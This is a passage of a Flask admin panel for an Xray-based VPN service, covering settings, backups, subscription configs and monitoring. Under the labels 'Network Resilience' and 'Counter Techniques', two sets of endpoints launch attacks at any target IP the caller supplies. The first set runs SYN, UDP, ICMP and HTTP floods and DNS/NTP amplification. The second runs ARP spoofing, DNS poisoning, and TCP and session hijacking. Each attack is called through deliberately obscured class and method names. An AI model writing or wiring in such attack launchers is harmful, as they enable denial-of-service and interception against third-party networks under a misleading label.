                # DPI Evasion (Real)
                "dpi_tcp_fragment", "dpi_tls_fragment", "dpi_ip_fragment",
                "dpi_tcp_keepalive", "dpi_dns_tunnel", "dpi_icmp_tunnel",
                "dpi_domain_front", "dpi_cdn_front_enabled", "dpi_cdn_front"]:
        if key in data:
            if settings.get(key) != data[key]:
                settings[key] = data[key]
                changed = True
                if key in ("cdn_enabled", "cdn_domain", "cdn_ws_path", "cdn_port",
                           "reality_dest", "reality_sni", "vless_port",
                           "vmess_port", "vmess_sni", "vmess_ws_path",
                           "trojan_enabled", "trojan_port",
                           "grpc_enabled", "grpc_port", "grpc_service_name",
                           "httpupgrade_enabled", "httpupgrade_port", "httpupgrade_path",
                           "ss2022_enabled", "ss2022_port", "ss2022_method",
                           "vless_ws_enabled", "vless_ws_port", "vless_ws_path",
                           "fingerprint", "noise_enabled", "noise_packet", "noise_delay",
                           "dpi_tcp_fragment", "dpi_tls_fragment", "dpi_ip_fragment",
                           "dpi_tcp_keepalive", "dpi_dns_tunnel", "dpi_icmp_tunnel",
                           "dpi_domain_front", "dpi_cdn_front_enabled", "dpi_cdn_front"):
                    rebuild = True

    if changed:
        save_settings(settings)
        if rebuild:
            write_xray_config()

    return jsonify({"ok": True, "rebuild": rebuild})


@app.route("/api/settings/regenerate-reality", methods=["POST"])
@require_auth
def api_regenerate_reality():
    global settings
    try:
        result = subprocess.run(
            [XRAY_BIN, "x25519"], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.strip().split("\n"):
            if line.startswith("PrivateKey:"):
                settings["reality_private_key"] = line.split(":", 1)[1].strip()
            elif "PublicKey" in line:
                settings["reality_public_key"] = line.split(":", 1)[1].strip()
        import secrets as sec
        settings["reality_short_id"] = sec.token_hex(4)
        save_settings(settings)
        write_xray_config()
        return jsonify({
            "ok": True,
            "public_key": settings["reality_public_key"],
            "short_id": settings["reality_short_id"],
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/settings/generate-ss2022-key", methods=["POST"])
@require_auth
def api_generate_ss2022_key():
    global settings
    import secrets as sec
    method = settings.get("ss2022_method", "2022-blake3-aes-128-gcm")
    key_len = 32 if "256" in method else 16
    key = base64.b64encode(sec.token_bytes(key_len)).decode()
    settings["ss2022_server_key"] = key
    save_settings(settings)
    write_xray_config()
    return jsonify({"ok": True, "ss2022_server_key": key})


# ── Enhanced API Endpoints ─────────────────────────────

@app.route("/api/report")
@require_auth
def api_get_report():
    """Get comprehensive user statistics report"""
    report = generate_user_report()
    return jsonify(report)


@app.route("/api/export/<format>")
@require_auth
def api_export_data(format):
    """Export users data in CSV or JSON format"""
    if format not in ['csv', 'json']:
        return jsonify({"error": "Invalid format"}), 400
    
    data, content_type = export_users_data(format)
    if not data:
        return jsonify({"error": "Export failed"}), 500
    
    filename = f"vpn_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format}"
    return send_file(
        io.BytesIO(data.encode()),
        mimetype=content_type,
        as_attachment=True,
        download_name=filename
    )


@app.route("/api/health")
@require_auth
def api_get_health():
    """Get system health metrics"""
    health = get_system_health()
    return jsonify(health)


@app.route("/api/analytics")
@require_auth
def api_get_analytics():
    """Get traffic analytics"""
    days = request.args.get('days', 7, type=int)
    analytics = get_traffic_analytics(days)
    return jsonify(analytics)


@app.route("/api/search")
@require_auth
def api_search_users():
    """Search users by name, UUID, or note"""
    query = request.args.get('q', '')
    if not query:
        return jsonify({"error": "Query required"}), 400
    
    users = search_users(query)
    return jsonify({"users": users, "count": len(users)})


@app.route("/api/users/<int:user_id>/stats")
@require_auth
def api_get_user_stats(user_id):
    """Get detailed statistics for a specific user"""
    stats = get_user_statistics(user_id)
    if not stats:
        return jsonify({"error": "User not found"}), 404
    return jsonify(stats)


@app.route("/api/bulk-update", methods=["POST"])
@require_auth
def api_bulk_update():
    """Bulk update multiple users"""
    data = request.json
    user_ids = data.get('user_ids', [])
    updates = data.get('updates', {})
    
    if not user_ids or not updates:
        return jsonify({"error": "user_ids and updates required"}), 400
    
    updated = bulk_update_users(user_ids, updates)
    return jsonify({"ok": True, "updated": updated})


@app.route("/api/backup/create", methods=["POST"])
@require_auth
def api_create_backup():
    """Create a backup of database and settings"""
    backup_path = create_backup()
    if backup_path:
        return jsonify({"ok": True, "backup_path": backup_path})
    return jsonify({"error": "Backup failed"}), 500


@app.route("/api/backup/restore", methods=["POST"])
@require_auth
def api_restore_backup():
    """Restore from backup file"""
    data = request.json
    backup_path = data.get('backup_path')
    
    if not backup_path:
        return jsonify({"error": "backup_path required"}), 400
    
    success, message = restore_backup(backup_path)
    if success:
        return jsonify({"ok": True, "message": message})
    return jsonify({"error": message}), 500


@app.route("/api/backup/list")
@require_auth
def api_list_backups():
    """List available backups"""
    backup_dir = "backups"
    backups = []
    
    if os.path.exists(backup_dir):
        for file in os.listdir(backup_dir):
            if file.startswith('vpn_backup_') and file.endswith('.zip'):
                file_path = os.path.join(backup_dir, file)
                stat = os.stat(file_path)
                backups.append({
                    'name': file,
                    'path': file_path,
                    'size': stat.st_size,
                    'created': datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
    
    backups.sort(key=lambda x: x['created'], reverse=True)
    return jsonify({"backups": backups})


@app.route("/api/backup/cleanup", methods=["POST"])
@require_auth
def api_cleanup_backups():
    """Remove old backups"""
    retention_days = request.json.get('retention_days', 7)
    removed = cleanup_old_backups(retention_days)
    return jsonify({"ok": True, "removed": removed})


# ── Network Resilience API ─────────────────────────────

_resilience_ops = {}
_counter_ops = {}

@app.route("/api/resilience/start", methods=["POST"])
@require_auth
def api_start_resilience_op():
    """Start a network resilience operation"""
    data = request.json
    attack_type = data.get('attack_type')
    target_ip = data.get('target_ip')
    target_port = data.get('target_port', 443)
    duration = data.get('duration', 60)
    
    if not attack_type or not target_ip:
        return jsonify({"error": "attack_type and target_ip required"}), 400
    
    try:
        from scripts.dpi_evasion import _A as AggressiveDPIEvasion
        aggressive = AggressiveDPIEvasion()
        
        attack_id = str(uuid_lib.uuid4())
        thread = None
        
        if attack_type == 'syn_flood':
            rate = data.get('rate', 10000)
            thread = aggressive.a1(target_ip, target_port, duration, rate)
        elif attack_type == 'udp_flood':
            ports = data.get('ports', [53, 80, 443])
            thread = aggressive.a2(target_ip, ports, duration)
        elif attack_type == 'icmp_flood':
            rate = data.get('rate', 3000)
            thread = aggressive.a3(target_ip, duration, rate)
        elif attack_type == 'http_flood':
            target_url = data.get('target_url', f'http://{target_ip}')
            rate = data.get('rate', 1000)
            thread = aggressive.a4(target_url, duration, rate)
        elif attack_type == 'dns_amp':
            dns_servers = data.get('dns_servers', ['8.8.8.8', '1.1.1.1'])
            thread = aggressive.a5(target_ip, dns_servers, duration)
        elif attack_type == 'ntp_amp':
            ntp_servers = data.get('ntp_servers', ['pool.ntp.org'])
            thread = aggressive.a6(target_ip, ntp_servers, duration)
        elif attack_type == 'combined':
            # Start multiple attacks
            thread1 = aggressive.a1(target_ip, target_port, duration, 10000)
            time.sleep(1)
            thread2 = aggressive.a3(target_ip, duration, 3000)
            thread = thread1  # Return first thread
        else:
            return jsonify({"error": "Invalid attack type"}), 400
        
        _resilience_ops[attack_id] = {
            'aggressive': aggressive,
            'thread': thread,
            'type': attack_type,
            'target': f"{target_ip}:{target_port}",
            'started': datetime.now().isoformat()
        }
        
        logger.info(f"Started resilience operation {attack_id}: {attack_type} on {target_ip}:{target_port}")
        return jsonify({"ok": True, "attack_id": attack_id})
        
    except Exception as e:
        logger.error(f"Failed to start resilience operation: {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/api/resilience/stop", methods=["POST"])
@require_auth
def api_stop_resilience_ops():
    """Stop all resilience operations"""
    try:
        for attack_id, attack_data in _resilience_ops.items():
            attack_data['aggressive'].stop()
            logger.info(f"Stopped resilience operation {attack_id}")
        
        _resilience_ops.clear()
        return jsonify({"ok": True, "stopped": len(_resilience_ops)})
        
    except Exception as e:
        logger.error(f"Failed to stop resilience operations: {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/api/resilience/status")
@require_auth
def api_resilience_status():
    """Get status of all resilience operations"""
    status = []
    for attack_id, attack_data in _resilience_ops.items():
        status.append({
            'attack_id': attack_id,
            'type': attack_data['type'],
            'target': attack_data['target'],
            'started': attack_data['started'],
            'running': attack_data['thread'].is_alive() if attack_data['thread'] else False
        })
    return jsonify({"attacks": status})


# ── Counter Techniques API ───────────────────────────────────

@app.route("/api/fightback/start", methods=["POST"])
@require_auth
def api_start_counter():
    """Start a counter technique"""
    data = request.json
    technique = data.get('technique')
    target_ip = data.get('target_ip')
    target_port = data.get('target_port', 443)
    duration = data.get('duration', 60)
    
    if not technique or not target_ip:
        return jsonify({"error": "technique and target_ip required"}), 400
    
    try:
        from scripts.dpi_evasion import _F as FightBackTechniques
        fightback = FightBackTechniques()
        
        technique_id = str(uuid_lib.uuid4())
        thread = None
        
        if technique == 'rst_flood':
            rate = data.get('rate', 5000)
            thread = fightback.f1(target_ip, target_port, duration, rate)
        elif technique == 'fin_flood':
            rate = data.get('rate', 3000)
            thread = fightback.f2(target_ip, target_port, duration, rate)
        elif technique == 'icmp_redirect':
            gateway_ip = data.get('gateway_ip', '192.168.1.254')
            thread = fightback.f3(target_ip, gateway_ip, duration)
        elif technique == 'arp_spoofing':
            gateway_ip = data.get('gateway_ip', '192.168.1.254')
            thread = fightback.f4(target_ip, gateway_ip, duration)
        elif technique == 'dns_poisoning':
            dns_server = data.get('dns_server', '8.8.8.8')
            domain = data.get('domain', 'google.com')
            fake_ip = data.get('fake_ip', '1.2.3.4')
            thread = fightback.f5(target_ip, dns_server, domain, fake_ip, duration)
        elif technique == 'tcp_hijacking':
            thread = fightback.f6(target_ip, target_port, duration)
        elif technique == 'session_hijacking':
            session_id = data.get('session_id', 'test-session')
            thread = fightback.f7(target_ip, target_port, session_id, duration)
        elif technique == 'combined':
            # Start multiple techniques
            thread1 = fightback.f1(target_ip, target_port, duration, 5000)
            time.sleep(1)
            thread2 = fightback.f2(target_ip, target_port, duration, 3000)
            thread = thread1
        else:
            return jsonify({"error": "Invalid technique"}), 400
        
        _counter_ops[technique_id] = {
            'fightback': fightback,
            'thread': thread,
            'technique': technique,
            'target': f"{target_ip}:{target_port}",
            'started': datetime.now().isoformat()
        }
        
        logger.info(f"Started counter technique {technique_id}: {technique} on {target_ip}:{target_port}")
        return jsonify({"ok": True, "technique_id": technique_id})
        
    except Exception as e:
        logger.error(f"Failed to start counter technique: {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/api/fightback/stop", methods=["POST"])
@require_auth
def api_stop_counter():
    """Stop all counter techniques"""
    try:
        for technique_id, technique_data in _counter_ops.items():
            technique_data['fightback'].stop()
            logger.info(f"Stopped counter technique {technique_id}")
        
        _counter_ops.clear()
        return jsonify({"ok": True, "stopped": len(_counter_ops)})
        
    except Exception as e:
        logger.error(f"Failed to stop counter techniques: {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/api/fightback/status")
@require_auth
def api_counter_status():
    """Get status of all counter techniques"""
    status = []
    for technique_id, technique_data in _counter_ops.items():
        status.append({
            'technique_id': technique_id,
            'technique': technique_data['technique'],
            'target': technique_data['target'],
            'started': technique_data['started'],
            'running': technique_data['thread'].is_alive() if technique_data['thread'] else False
        })
    return jsonify({"techniques": status})


@app.route("/api/users/<name>/activity")
@require_auth
def api_get_user_activity(name):
    """Get activity history for a user"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE name = ?", (name,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    activity = get_user_activity_history(name)
    return jsonify({"activity": activity})


@app.route("/sub-json/<user_uuid>")
def subscription_json(user_uuid):
    """Return full Xray client JSON config with fragment/mux/fingerprint for advanced clients."""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT name, uuid, active, traffic_used_gb, traffic_limit_gb FROM users WHERE uuid=?", (user_uuid,))
    row = c.fetchone()
    conn.close()
    if not row or not row["active"]:
        return "Not found", 404

    s = settings
    prefix = s.get("config_prefix") or "Proxy"
    sni = s.get("vmess_sni") or SNI_HOST
    fp = s.get("fingerprint", "chrome")
    name = row["name"]
    uid = row["uuid"]

    outbounds = []

    # ── VMess + WS + TLS ──
    vmess_out = {
        "tag": f"{prefix}-VMess-{name}",
        "protocol": "vmess",
        "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vmess_port", 443)), "users": [{"id": uid, "alterId": 0, "security": "auto"}]}]},
        "streamSettings": {
            "network": "ws", "security": "tls",
            "wsSettings": {"path": s.get("vmess_ws_path") or WS_PATH, "headers": {"Host": sni}},
            "tlsSettings": {"serverName": sni, "fingerprint": fp, "allowInsecure": True},
        },
    }
    outbounds.append(vmess_out)

    # ── VLESS + Reality ──
    if s.get("reality_public_key"):
        vless_out = {
            "tag": f"{prefix}-VLESS-{name}",
            "protocol": "vless",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vless_port", 2053)), "users": [{"id": uid, "encryption": "none", "flow": "xtls-rprx-vision"}]}]},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "serverName": s.get("reality_sni", "chat.deepseek.com"),
                    "fingerprint": fp,
                    "publicKey": s["reality_public_key"],
                    "shortId": s.get("reality_short_id", ""),
                },
            },
        }
        outbounds.append(vless_out)

    # ── CDN VMess ──
    if s.get("cdn_enabled") and s.get("cdn_domain"):
        cdn_out = {
            "tag": f"{prefix}-CDN-{name}",
            "protocol": "vmess",
            "settings": {"vnext": [{"address": s["cdn_domain"], "port": int(s.get("cdn_port", 2082)), "users": [{"id": uid, "alterId": 0, "security": "auto"}]}]},
            "streamSettings": {
                "network": "ws", "security": "none",
                "wsSettings": {"path": s.get("cdn_ws_path") or "/cdn-ws", "headers": {"Host": s["cdn_domain"]}},
            },
        }
        outbounds.append(cdn_out)

    # ── Trojan + TLS ──
    if s.get("trojan_enabled"):
        trojan_out = {
            "tag": f"{prefix}-Trojan-{name}",
            "protocol": "trojan",
            "settings": {"servers": [{"address": SERVER_IP, "port": int(s.get("trojan_port", 2083)), "password": uid}]},
            "streamSettings": {
                "network": "tcp", "security": "tls",
                "tlsSettings": {"serverName": sni, "fingerprint": fp, "allowInsecure": True},
            },
        }
        outbounds.append(trojan_out)

    # ── gRPC + TLS ──
    if s.get("grpc_enabled"):
        grpc_out = {
            "tag": f"{prefix}-gRPC-{name}",
            "protocol": "vmess",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("grpc_port", 2054)), "users": [{"id": uid, "alterId": 0, "security": "auto"}]}]},
            "streamSettings": {
                "network": "grpc", "security": "tls",
                "grpcSettings": {"serviceName": s.get("grpc_service_name", "GunService")},
                "tlsSettings": {"serverName": sni, "fingerprint": fp, "allowInsecure": True},
            },
        }
        outbounds.append(grpc_out)

    # ── HTTPUpgrade + TLS ──
    if s.get("httpupgrade_enabled"):
        hu_out = {
            "tag": f"{prefix}-HU-{name}",
            "protocol": "vmess",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("httpupgrade_port", 2055)), "users": [{"id": uid, "alterId": 0, "security": "auto"}]}]},
            "streamSettings": {
                "network": "httpupgrade", "security": "tls",
                "httpupgradeSettings": {"path": s.get("httpupgrade_path") or "/httpupgrade", "host": sni},
                "tlsSettings": {"serverName": sni, "fingerprint": fp, "allowInsecure": True},
            },
        }
        outbounds.append(hu_out)

    # ── ShadowSocks 2022 ──
    if s.get("ss2022_enabled") and s.get("ss2022_server_key"):
        method = s.get("ss2022_method", "2022-blake3-aes-128-gcm")
        user_key = _ss2022_user_key(uid, method)
        ss_out = {
            "tag": f"{prefix}-SS2022-{name}",
            "protocol": "shadowsocks",
            "settings": {"servers": [{"address": SERVER_IP, "port": int(s.get("ss2022_port", 2056)), "method": method, "password": f"{s['ss2022_server_key']}:{user_key}"}]},
            "streamSettings": {"network": "tcp"},
        }
        outbounds.append(ss_out)

    # ── VLESS + WS + TLS ──
    if s.get("vless_ws_enabled"):
        vws_out = {
            "tag": f"{prefix}-VWS-{name}",
            "protocol": "vless",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vless_ws_port", 2057)), "users": [{"id": uid, "encryption": "none"}]}]},
            "streamSettings": {
                "network": "ws", "security": "tls",
                "wsSettings": {"path": s.get("vless_ws_path") or "/vless-ws", "headers": {"Host": sni}},
                "tlsSettings": {"serverName": sni, "fingerprint": fp, "allowInsecure": True},
            },
        }
        outbounds.append(vws_out)

    # ── VLESS + XHTTP + Reality ──
    if s.get("vless_xhttp_enabled"):
        xhttp_out = {
            "tag": f"{prefix}-XHTTP-{name}",
            "protocol": "vless",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vless_xhttp_port", 2053)), "users": [{"id": uid, "encryption": "none"}]}]},
            "streamSettings": {
                "network": "xhttp", "security": "reality",
                "realitySettings": {
                    "serverName": s.get("vless_xhttp_reality_sni", "digikala.com"),
                    "fingerprint": fp,
                    "publicKey": s.get("vless_xhttp_reality_public_key", ""),
                    "shortId": s.get("vless_xhttp_reality_short_id", ""),
                },
                "xhttpSettings": {
                    "path": s.get("vless_xhttp_path", "/xhttp-stream"),
                    "mode": s.get("vless_xhttp_mode", "auto"),
                },
            },
        }
        outbounds.append(xhttp_out)

    # ── VLESS + Reality + Vision ──
    if s.get("vless_vision_enabled"):
        vision_out = {
            "tag": f"{prefix}-Vision-{name}",
            "protocol": "vless",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vless_vision_port", 2058)), "users": [{"id": uid, "encryption": "none", "flow": s.get("vless_vision_flow", "xtls-rprx-vision")}]}]},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "serverName": s.get("vless_vision_reality_sni", "objects.githubusercontent.com"),
                    "fingerprint": fp,
                    "publicKey": s.get("vless_vision_reality_public_key", ""),
                    "shortId": s.get("vless_vision_reality_short_id", ""),
                },
            },
        }
        outbounds.append(vision_out)

    # ── VLESS + Reverse Tunnel + Reality ──
    if s.get("vless_reverse_enabled"):
        reverse_out = {
            "tag": f"{prefix}-Reverse-{name}",
            "protocol": "vless",
            "settings": {"vnext": [{"address": SERVER_IP, "port": int(s.get("vless_reverse_port", 2059)), "users": [{"id": uid, "encryption": "none"}]}]},
            "streamSettings": {
                "network": "tcp", "security": "reality",
                "realitySettings": {
                    "serverName": s.get("vless_reverse_reality_sni", "digikala.com"),
                    "fingerprint": fp,
                    "publicKey": s.get("vless_reverse_reality_public_key", ""),
                    "shortId": s.get("vless_reverse_reality_short_id", ""),
                },
            },
        }
        outbounds.append(reverse_out)

    # ── Trojan + WS/gRPC (CDN) ──
    if s.get("trojan_cdn_enabled"):
        host = s.get("trojan_cdn_domain", "")
        trojan_cdn_out = {
            "tag": f"{prefix}-Trojan-CDN-{name}",
            "protocol": "trojan",
            "settings": {"servers": [{"address": host if host else SERVER_IP, "port": int(s.get("trojan_cdn_port", 2083)), "password": uid}]},
            "streamSettings": {
                "network": "ws", "security": "tls" if s.get("trojan_cdn_tls_enabled", True) else "none",
                "wsSettings": {"path": s.get("trojan_cdn_ws_path", "/trojan-ws"), "headers": {"Host": host}},
                "tlsSettings": {"serverName": s.get("trojan_cdn_sni", ""), "fingerprint": fp, "allowInsecure": True} if s.get("trojan_cdn_tls_enabled", True) else None,
            },
        }
        outbounds.append(trojan_cdn_out)

    # ── Apply Fragment & MUX to all outbounds ──
    for ob in outbounds:
        if s.get("fragment_enabled"):
            sock = ob["streamSettings"].setdefault("sockopt", {})
            sock["dialerProxy"] = ""
            sock["tcpKeepAliveInterval"] = 0
            fragments = s.get("fragment_packets", "tlshello")
            length = s.get("fragment_length", "100-200")
            interval = s.get("fragment_interval", "10-20")
            ob["streamSettings"]["sockopt"]["fragment"] = {
                "packets": fragments,
                "length": length,
                "interval": interval,
            }
        if s.get("mux_enabled"):
            ob["mux"] = {"enabled": True, "concurrency": int(s.get("mux_concurrency", 8))}
        if s.get("noise_enabled"):
            ob["streamSettings"].setdefault("sockopt", {})["noisePacket"] = s.get("noise_packet", "rand:50-100")
            ob["streamSettings"]["sockopt"]["noiseDelay"] = s.get("noise_delay", "10-20")

    # ── Direct & block outbounds ──
    outbounds.append({"tag": "direct", "protocol": "freedom"})
    outbounds.append({"tag": "block", "protocol": "blackhole"})

    config = {
        "log": {"loglevel": "warning"},
        "inbounds": [{"tag": "socks-in", "port": 10808, "protocol": "socks", "settings": {"udp": True}}, {"tag": "http-in", "port": 10809, "protocol": "http"}],
        "outbounds": outbounds,
        "routing": {"rules": [{"type": "field", "outboundTag": outbounds[0]["tag"], "port": "0-65535"}]},
    }

    resp = app.make_response(json.dumps(config, indent=2))
    resp.headers["Content-Type"] = "application/json; charset=utf-8"
    resp.headers["Content-Disposition"] = f"inline; filename={name}-xray.json"
    resp.headers["Profile-Update-Interval"] = "6"
    resp.headers["Subscription-Userinfo"] = (
        f"upload=0; download={int((row['traffic_used_gb'] or 0) * 1073741824)}; "
        f"total={int((row['traffic_limit_gb'] or 0) * 1073741824)}"
    )
    return resp


# ── Kill Switch API ────────────────────────────────────

@app.route("/api/kill-switch/log")
@require_auth
def api_kill_switch_log():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT ts, username, host, reason FROM kill_switch_log ORDER BY id DESC LIMIT 50")
    rows = [{"ts": r["ts"], "username": r["username"], "host": r["host"], "reason": r["reason"]}
            for r in c.fetchall()]
    conn.close()
    return jsonify(rows)


# ── Backup API ─────────────────────────────────────────

@app.route("/api/backup/run", methods=["POST"])
@require_auth
def api_run_backup():
    try:
        result = subprocess.run(
            ["sudo", BACKUP_SCRIPT, str(settings.get("backup_retention_days", 7))],
            capture_output=True, text=True, timeout=30,
        )
        return jsonify({"ok": True, "output": result.stdout.strip()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/backups-old")
@require_auth
def api_list_backups_old():
    if not os.path.isdir(BACKUP_DIR):
        return jsonify([])
    files = sorted(globmod.glob(os.path.join(BACKUP_DIR, "*.tar.gz")), reverse=True)
    backups = []
    for f in files[:20]:
        name = os.path.basename(f)
        stat = os.stat(f)
        backups.append({
            "name": name,
            "size": stat.st_size,
            "time": datetime.fromtimestamp(stat.st_mtime).isoformat()[:19],
        })
    return jsonify(backups)



# ── System Monitor API ─────────────────────────────────

@app.route("/api/system-monitor")
@require_auth
def api_system_monitor():
    import psutil
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    net = psutil.net_io_counters()
    boot = psutil.boot_time()
    uptime_secs = int(time.time() - boot)
    load = list(os.getloadavg())

    xray_pid = None
    xray_version = None
    xray_mem = 0
    xray_cpu = 0.0
    for proc in psutil.process_iter(["pid", "name", "cmdline"]):
        try:
            if proc.info["name"] == "xray" or (proc.info["cmdline"] and "xray" in " ".join(proc.info["cmdline"])):
                xray_pid = proc.pid
                pi = psutil.Process(xray_pid)
                xray_mem = pi.memory_info().rss
                xray_cpu = pi.cpu_percent(interval=0.1)
                try:
                    out = subprocess.check_output(["/usr/local/bin/xray", "version"], timeout=3, stderr=subprocess.STDOUT).decode()
                    xray_version = out.split()[1] if len(out.split()) > 1 else out.strip()
                except Exception:
                    xray_version = "?"
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    return jsonify({
        "cpu_percent": cpu,
        "ram_percent": mem.percent,
        "ram_used": mem.used,
        "ram_total": mem.total,
        "disk_percent": disk.percent,
        "disk_used": disk.used,
        "disk_total": disk.total,
        "uptime_seconds": uptime_secs,
        "load_avg": load,
        "net_bytes_sent": net.bytes_sent,
        "net_bytes_recv": net.bytes_recv,
        "xray_pid": xray_pid,
        "xray_version": xray_version,
        "xray_mem": xray_mem,
        "xray_cpu": xray_cpu,
    })

# ── Server Info API ────────────────────────────────────

@app.route("/api/server-info")
@require_auth
def api_server_info():
    s = settings
    has_vless = bool(s.get("reality_public_key"))
    has_cdn = _as_bool(s.get("cdn_enabled")) and bool(s.get("cdn_domain"))
    has_trojan = _as_bool(s.get("trojan_enabled"))
    has_grpc = _as_bool(s.get("grpc_enabled"))
    has_hu = _as_bool(s.get("httpupgrade_enabled"))
    has_ss2022 = _as_bool(s.get("ss2022_enabled")) and bool(s.get("ss2022_server_key"))
    has_vless_ws = _as_bool(s.get("vless_ws_enabled"))
    has_vless_xhttp = _as_bool(s.get("vless_xhttp_enabled"))
    has_vless_vision = _as_bool(s.get("vless_vision_enabled"))
    has_vless_reverse = _as_bool(s.get("vless_reverse_enabled"))
    has_trojan_cdn = _as_bool(s.get("trojan_cdn_enabled"))
    has_hysteria2 = _as_bool(s.get("hysteria2_enabled"))
    has_tuic = _as_bool(s.get("tuic_enabled"))
    has_amneziawg = _as_bool(s.get("amneziawg_enabled"))
    has_shadowtls = _as_bool(s.get("shadowtls_enabled"))
    has_mieru = _as_bool(s.get("mieru_enabled"))
    has_naiveproxy = _as_bool(s.get("naiveproxy_enabled"))
    has_wireguard = _as_bool(s.get("wireguard_enabled"))
    has_openvpn = _as_bool(s.get("openvpn_enabled"))
    return jsonify({
        "vmess": True,
        "vless": has_vless,
        "cdn": has_cdn,
        "trojan": has_trojan,
        "grpc": has_grpc,
        "httpupgrade": has_hu,
        "ss2022": has_ss2022,
        "vless_ws": has_vless_ws,
        "vless_xhttp": has_vless_xhttp,
        "vless_vision": has_vless_vision,
        "vless_reverse": has_vless_reverse,
        "trojan_cdn": has_trojan_cdn,
        "hysteria2": has_hysteria2,
        "tuic": has_tuic,
        "amneziawg": has_amneziawg,
        "shadowtls": has_shadowtls,
        "mieru": has_mieru,
        "naiveproxy": has_naiveproxy,
        "wireguard": has_wireguard,
        "openvpn": has_openvpn,
        # Enabled flags (for tab visibility)
        "vmess_enabled": True,
        "vless_enabled": has_vless,
        "cdn_enabled": has_cdn,
        "trojan_enabled": has_trojan,
        "grpc_enabled": has_grpc,
        "httpupgrade_enabled": has_hu,
        "ss2022_enabled": has_ss2022,
        "vless_ws_enabled": has_vless_ws,
        "vless_xhttp_enabled": has_vless_xhttp,
        "vless_vision_enabled": has_vless_vision,
        "vless_reverse_enabled": has_vless_reverse,
        "trojan_cdn_enabled": has_trojan_cdn,
        "hysteria2_enabled": has_hysteria2,
        "tuic_enabled": has_tuic,
        "amneziawg_enabled": has_amneziawg,
        "shadowtls_enabled": has_shadowtls,
        "mieru_enabled": has_mieru,
        "naiveproxy_enabled": has_naiveproxy,
        "wireguard_enabled": has_wireguard,
        "openvpn_enabled": has_openvpn,
        # Ports & paths
        "vmess_port": s.get("vmess_port", 443),
        "vless_port": s.get("vless_port", 2053),
        "vless_sni": s.get("reality_sni", ""),
        "vless_public_key": s.get("reality_public_key", ""),
        "vless_short_id": s.get("reality_short_id", ""),
        "cdn_domain": s.get("cdn_domain", ""),
        "cdn_port": s.get("cdn_port", 2082),
        "cdn_ws_path": s.get("cdn_ws_path", "/cdn-ws"),
        "trojan_port": s.get("trojan_port", 2083),
        "grpc_port": s.get("grpc_port", 2054),
        "grpc_service": s.get("grpc_service_name", "GunService"),
        "httpupgrade_port": s.get("httpupgrade_port", 2055),
        "httpupgrade_path": s.get("httpupgrade_path", "/httpupgrade"),
        "ss2022_port": s.get("ss2022_port", 2056),
        "vless_ws_port": s.get("vless_ws_port", 2057),
        "vless_ws_path": s.get("vless_ws_path", "/vless-ws"),
        # New protocol ports & paths
        "vless_xhttp_port": s.get("vless_xhttp_port", 2053),
        "vless_xhttp_mode": s.get("vless_xhttp_mode", "auto"),
        "vless_xhttp_path": s.get("vless_xhttp_path", "/xhttp-stream"),
        "vless_vision_port": s.get("vless_vision_port", 2058),
        "vless_reverse_port": s.get("vless_reverse_port", 2059),
        "vless_reverse_backhaul_mode": s.get("vless_reverse_backhaul_mode", "rathole"),
        "trojan_cdn_domain": s.get("trojan_cdn_domain", ""),
        "trojan_cdn_port": s.get("trojan_cdn_port", 2083),
        "trojan_cdn_ws_path": s.get("trojan_cdn_ws_path", "/trojan-ws"),
        "hysteria2_port": s.get("hysteria2_port", 8443),
        "hysteria2_salamander": _as_bool(s.get("hysteria2_salamander_enabled", False)),
        "tuic_port": s.get("tuic_port", 8444),
        "tuic_congestion": s.get("tuic_congestion_control", "cubic"),
        "amneziawg_port": s.get("amneziawg_port", 51820),
        "amneziawg_mtu": s.get("amneziawg_mtu", 1280),
        "shadowtls_port": s.get("shadowtls_port", 8445),
        "shadowtls_sni": s.get("shadowtls_sni", "rubika.ir"),
        "mieru_port": s.get("mieru_port", 8446),
        "mieru_encryption": s.get("mieru_encryption", "aes-256-gcm"),
        "mieru_transport": s.get("mieru_transport", "tcp"),
        "naiveproxy_port": s.get("naiveproxy_port", 8447),
        "wireguard_port": s.get("wireguard_port", 51821),
        "wireguard_mtu": s.get("wireguard_mtu", 1280),
        "openvpn_port": s.get("openvpn_port", 1194),
        "openvpn_proto": s.get("openvpn_proto", "udp"),
        # Misc
        "kill_switch": _as_bool(s.get("kill_switch_enabled", False)),
        "fragment_enabled": _as_bool(s.get("fragment_enabled", False)),
        "mux_enabled": _as_bool(s.get("mux_enabled", False)),
    })


# ── Agent CRUD (Admin side) ─────────────────────────────

@app.route("/api/agents")
@require_auth
def api_list_agents():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id, name, traffic_quota_gb, active, created_at, speed_limit_default FROM agents ORDER BY id DESC")
    rows = c.fetchall()
    out = []
    for r in rows:
        c.execute("SELECT COALESCE(SUM(traffic_limit_gb), 0) as used, COUNT(*) as cnt FROM users WHERE agent_id=?", (r["id"],))
        usage = c.fetchone()
        out.append({
            "id": r["id"], "name": r["name"],
            "traffic_quota_gb": r["traffic_quota_gb"],
            "traffic_used_gb": round(float(usage["used"]), 2),
